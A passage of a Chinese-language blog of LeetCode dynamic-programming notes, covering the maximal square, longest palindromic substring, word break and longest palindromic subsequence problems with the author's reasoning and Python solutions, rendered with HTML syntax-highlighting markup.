class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> i <span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>                <span class="token keyword">elif</span> j<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>                <span class="token keyword">elif</span> j<span class="token operator">==</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>        <span class="token keyword">return</span> <span class="token builtin">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="221-最大正方"><a class="markdownIt-Anchor" href="#221-最大正方"></a> <a href="https://leetcode.cn/problems/maximal-square/">221. 最大正方</a></h3><p>在一个由 <code>'0'</code> 和 <code>'1'</code> 组成的二维矩阵内，找到只包含 <code>'1'</code> 的最大正方形，并返回其面积。</p><h4 id="思路-23"><a class="markdownIt-Anchor" href="#思路-23"></a> 思路</h4><p>这个题…想了几十分钟。。。。</p><p>感觉需要很强的抽象能力才能划分成子问题</p><ul><li><p>重新开个dp存储最大正方形的边长</p></li><li><p>设置dp[i] [j]为以(i,j)为右下角最大正方形的边长</p></li></ul><pre class="line-numbers language-none"><code class="language-none">当且仅当该位置为1的时候才存在正方形此处可以构成的最大正方形的边长，是其正上方，左侧，和左上界三者共同约束的，且为三者中的最小值加1。dp[i][j]&#x3D;min(dp[i-1][j-1],dp[i-1][j],dp[i][j-1])+1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>于是</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">maximalSquare</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> matrix<span class="token punctuation">:</span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>        m<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>matrix<span class="token punctuation">)</span>        n<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>matrix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        dp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'0'</span><span class="token punctuation">:</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>j<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span>                    <span class="token keyword">else</span><span class="token punctuation">:</span>                        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span>        max2<span class="token operator">=</span><span class="token number">0</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>            temp<span class="token operator">=</span><span class="token builtin">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> temp <span class="token operator">></span> max2<span class="token punctuation">:</span>                max2<span class="token operator">=</span>temp        <span class="token keyword">return</span> max2<span class="token operator">*</span>max2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="字符串"><a class="markdownIt-Anchor" href="#字符串"></a> 字符串</h2><h3 id="5-最长回文子串"><a class="markdownIt-Anchor" href="#5-最长回文子串"></a> <a href="https://leetcode.cn/problems/longest-palindromic-substring/">5. 最长回文子串</a></h3><p>给你一个字符串 <code>s</code>，找到 <code>s</code> 中最长的回文子串。</p><p>如果字符串的反序与原始字符串相同，则该字符串称为回文字符串。</p><h4 id="思路-24"><a class="markdownIt-Anchor" href="#思路-24"></a> 思路</h4><p>最初的思路是暴力枚举</p><p>但是复杂度是n**3，想着有没有更好的算法</p><p><a href="https://leetcode.cn/problems/longest-palindromic-substring/solutions/255195/zui-chang-hui-wen-zi-chuan-by-leetcode-solution/?envType=study-plan-v2&amp;envId=dynamic-programming">最长回文子串详细解析</a></p><p>虽然但是，我觉得这题用dp还是不太好理解</p><p>中心拓展的方法更直观</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">expandAroundCenter</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>s<span class="token punctuation">,</span>l<span class="token punctuation">,</span>r<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> l<span class="token operator">>=</span><span class="token number">0</span> <span class="token keyword">and</span> r<span class="token operator">&lt;</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">and</span> s<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token operator">==</span>s<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">:</span>            l<span class="token operator">-=</span><span class="token number">1</span>            r<span class="token operator">+=</span><span class="token number">1</span>        <span class="token keyword">return</span> l<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>r<span class="token operator">-</span><span class="token number">1</span>    <span class="token keyword">def</span> <span class="token function">longestPalindrome</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> s<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>        start<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span>        n<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>            l1<span class="token punctuation">,</span>r1<span class="token operator">=</span>self<span class="token punctuation">.</span>expandAroundCenter<span class="token punctuation">(</span>s<span class="token punctuation">,</span>i<span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token comment">#拓展奇数回文子串</span>            l2<span class="token punctuation">,</span>r2<span class="token operator">=</span>self<span class="token punctuation">.</span>expandAroundCenter<span class="token punctuation">(</span>s<span class="token punctuation">,</span>i<span class="token punctuation">,</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#拓展偶数回文子串</span>            <span class="token keyword">if</span> r1<span class="token operator">-</span>l1 <span class="token operator">></span> end<span class="token operator">-</span>start<span class="token punctuation">:</span>                end<span class="token punctuation">,</span>start<span class="token operator">=</span>r1<span class="token punctuation">,</span>l1            <span class="token keyword">if</span> r2<span class="token operator">-</span>l2 <span class="token operator">></span>end <span class="token operator">-</span>start<span class="token punctuation">:</span>                end<span class="token punctuation">,</span>start<span class="token operator">=</span>r2<span class="token punctuation">,</span>l2        <span class="token keyword">return</span> s<span class="token punctuation">[</span>start<span class="token punctuation">:</span>end<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>dp思路</p><pre class="line-numbers language-none"><code class="language-none">方法二：动态规划回文天然具有「状态转移」性质：一个长度严格大于 222 的回文去掉头尾字符以后，剩下的部分依然是回文。反之，如果一个字符串头尾两个字符都不相等，那么这个字符串一定不是回文。「动态规划」的方法根据这样的性质得到。第 1 步：定义状态dp[i][j] 表示：子串 s[i..j] 是否为回文子串，这里子串 s[i..j] 定义为左闭右闭区间，即可以取到 s[i] 和 s[j]。第 2 步：思考状态转移方程根据头尾字符是否相等，需要分类讨论：dp[i][j] &#x3D; (s[i] &#x3D;&#x3D; s[j]) and dp[i + 1][j - 1]说明：「动态规划」的「自底向上」求解问题的思路，很多时候是在填写一张二维表格。由于 s[i..j] 表示 s 的一个子串，因此 i 和 j 的关系是 i &lt;&#x3D; j，只需要填这张表格对角线以上的部分；看到 dp[i + 1][j - 1] 就需要考虑特殊情况：如果去掉 s[i..j] 头尾两个字符子串 s[i + 1..j - 1] 的长度严格小于 222（不构成区间），即 j−1−(i+1)+1&lt;2j - 1 - (i + 1) + 1 &lt; 2j−1−(i+1)+1&lt;2 时，整理得 j−i&lt;3j - i &lt; 3j−i&lt;3，此时 s[i..j] 是否是回文只取决于 s[i] 与 s[j] 是否相等。结论也比较直观：j−i&lt;3j - i &lt; 3j−i&lt;3 等价于 j−i+1&lt;4j - i + 1 &lt; 4j−i+1&lt;4，即当子串 s[i..j]s[i..j]s[i..j] 的长度等于 222 或者等于 333 的时候，s[i..j] 是否是回文由 s[i] 与 s[j] 是否相等决定。第 3 步：考虑初始化单个字符一定是回文串，因此把对角线先初始化为 true，即 dp[i][i] &#x3D; true。根据第 2 步的说明：当 s[i..j] 的长度为 222 时，只需要判断 s[i] 是否等于 s[j]，所以二维表格对角线上的数值不会被参考。所以不设置 dp[i][i] &#x3D; true 也能得到正确结论。第 4 步：考虑输出一旦得到 dp[i][j] &#x3D; true，就记录子串的「长度」和「起始位置」。没有必要截取，这是因为截取字符串也有性能消耗。第 5 步：考虑优化空间下面给出的「参考代码」，在填表的过程中，只参考了左下方的数值。事实上可以优化，但是增加了代码编写和理解的难度，丢失了可读性和可解释性。在这里不做优化空间；填表应该遵守这样的原则：总是先得到小子串是否是回文的结果，然后大子串才能参考小子串的判断结果，所以填表顺序很重要；建议自己动手，画一下表格，相信会对「动态规划」作为一种「表格法」有更好的理解。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">longestPalindrome</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> s<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>        n<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>        dp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">[</span>i <span class="token operator">==</span> j <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token comment">#先枚举子串长度</span>        maxlen<span class="token operator">=</span><span class="token number">1</span>        begin<span class="token operator">=</span><span class="token number">0</span>        <span class="token keyword">if</span> n <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> s        <span class="token keyword">for</span> L <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment">#枚举左边界</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token comment">#由L，i确定右边界:</span>                j<span class="token operator">=</span>L<span class="token operator">+</span>i<span class="token operator">-</span><span class="token number">1</span>                <span class="token comment">#如果越界:</span>                <span class="token keyword">if</span> j<span class="token operator">>=</span>n<span class="token punctuation">:</span>                    <span class="token keyword">break</span>                                <span class="token keyword">if</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span>s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span> j<span class="token operator">-</span>i <span class="token operator">&lt;</span><span class="token number">3</span><span class="token punctuation">:</span>                        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">True</span>                    <span class="token keyword">else</span><span class="token punctuation">:</span>                        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>dp<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">False</span>                                <span class="token keyword">if</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token keyword">and</span> j<span class="token operator">-</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token operator">></span>maxlen<span class="token punctuation">:</span>                    maxlen<span class="token operator">=</span>j<span class="token operator">-</span>i<span class="token operator">+</span><span class="token number">1</span>                    begin<span class="token operator">=</span>i        <span class="token keyword">return</span> s<span class="token punctuation">[</span>begin<span class="token punctuation">:</span>begin<span class="token operator">+</span>maxlen<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="139-单词拆分"><a class="markdownIt-Anchor" href="#139-单词拆分"></a> <a href="https://leetcode.cn/problems/word-break/">139. 单词拆分</a></h3><p>给你一个字符串 <code>s</code> 和一个字符串列表 <code>wordDict</code> 作为字典。如果可以利用字典中出现的一个或多个单词拼接出 <code>s</code> 则返回 <code>true</code>。</p><p>**注意：**不要求字典中出现的单词全部都使用，并且字典中的单词可以重复使用。</p><p>刚开始的思路是这样的</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">wordBreak</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> s<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> wordDict<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>        flag<span class="token operator">=</span><span class="token boolean">False</span>        i<span class="token operator">=</span><span class="token number">0</span>        j<span class="token operator">=</span><span class="token number">0</span>        <span class="token keyword">while</span> <span class="token keyword">not</span> flag<span class="token punctuation">:</span>            <span class="token keyword">if</span> i<span class="token operator">&lt;=</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">and</span> j <span class="token operator">&lt;=</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> s<span class="token punctuation">[</span>i<span class="token punctuation">:</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">in</span> wordDict<span class="token punctuation">:</span>                    i<span class="token operator">=</span>j<span class="token operator">+</span><span class="token number">1</span>                    j<span class="token operator">=</span>j<span class="token operator">+</span><span class="token number">1</span>                    <span class="token keyword">continue</span>            <span class="token keyword">if</span> i<span class="token operator">></span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">and</span> j<span class="token operator">></span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>                flag<span class="token operator">=</span><span class="token boolean">True</span>            <span class="token keyword">elif</span> j<span class="token operator">></span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">and</span> i <span class="token operator">&lt;=</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>            j<span class="token operator">+=</span><span class="token number">1</span>        <span class="token keyword">return</span> flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>就是逐个截取</p><p>但是</p><pre class="line-numbers language-none"><code class="language-none">输入s &#x3D;&quot;aaaaaaa&quot;wordDict &#x3D;[&quot;aaaa&quot;,&quot;aaa&quot;] 直接寄了，因为每次先读取aaa  aaa+aaa+a不符合<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>还是想到用动态规划</p><p>我们需要判断一个字符串是否可以由一个字典中的多个单词组合而成，这自然让人想到将问题拆分成更小的子问题。</p><p>具体来说，我们可以考虑字符串的每一个子串，看它是否可以由字典中的单词组成，这可以通过检查之前的子串是否能由字典中的单词组成来实现，从而形成了子问题间的依赖关系。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">wordBreak</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> s<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> wordDict<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>       <span class="token comment"># 创建一个长度为 len(s) + 1 的布尔型数组 dp</span>        dp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token boolean">False</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment"># 空字符串总是可以被表示，因此 dp[0] 设为 True</span>        dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token comment"># 遍历字符串 s 的每个子字符串</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 遍历字典 wordDict 中的每个单词</span>            <span class="token keyword">for</span> word <span class="token keyword">in</span> wordDict<span class="token punctuation">:</span>            <span class="token comment"># 检查以 i 结尾的子字符串是否可以由 wordDict 中的单词组成</span>            <span class="token comment"># 条件：dp[i - len(word)] 为 True 且 s 的子字符串与 word 匹配</span>                <span class="token keyword">if</span> i<span class="token operator">>=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span> <span class="token keyword">and</span> dp<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">and</span> s<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span><span class="token punctuation">:</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> word<span class="token punctuation">:</span>                <span class="token comment"># 如果可以，将 dp[i] 设置为 True，并跳出循环</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span>                    <span class="token keyword">break</span>    <span class="token comment"># 返回 dp[len(s)] 的值，表示整个字符串 s 是否可以由 wordDict 中的单词组成</span>        <span class="token keyword">return</span> dp<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="516-最长回文子序列"><a class="markdownIt-Anchor" href="#516-最长回文子序列"></a> <a href="https://leetcode.cn/problems/longest-palindromic-subsequence/">516. 最长回文子序列</a></h3><p>给你一个字符串 <code>s</code> ，找出其中最长的回文子序列，并返回该序列的长度。</p><p>子序列定义为：不改变剩余字符顺序的情况下，删除某些字符或者不删除任何字符形成的一个序列。</p><h4 id="思路-25"><a class="markdownIt-Anchor" href="#思路-25"></a> 思路</h4><pre class="line-numbers language-none"><code class="language-none">设置dp[i][j]为字符串s在下标区间i,j之间的最长回文长度dp[i][j]&#x3D;dp[i+1][j-1]+2 当s[i]&#x3D;s[j]dp[i][j]&#x3D;max(dp[i+1][j],dp[i][j-1]) 当s[i]!&#x3D;s[j]然后根据图标确定约束关系，确定遍历顺序比较重要从递推公式dp[i][j] &#x3D; dp[i + 1][j - 1] + 2 和 dp[i][j] &#x3D; max(dp[i + 1][j], dp[i][j - 1]) 可以看出，dp[i][j]是依赖于dp[i + 1][j - 1] 和 dp[i + 1][j]，也就是从矩阵的角度来说，dp[i][j] 下一行的数据。 所以遍历i的时候一定要从下到上遍历，这样才能保证，下一行的数据是经过计算的。如果i&lt;j则认为数据不合法dp[i][j]&#x3D;0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">longestPalindromeSubseq</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> s<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>        n<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>        dp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment">#单个字符的长度都是1</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span 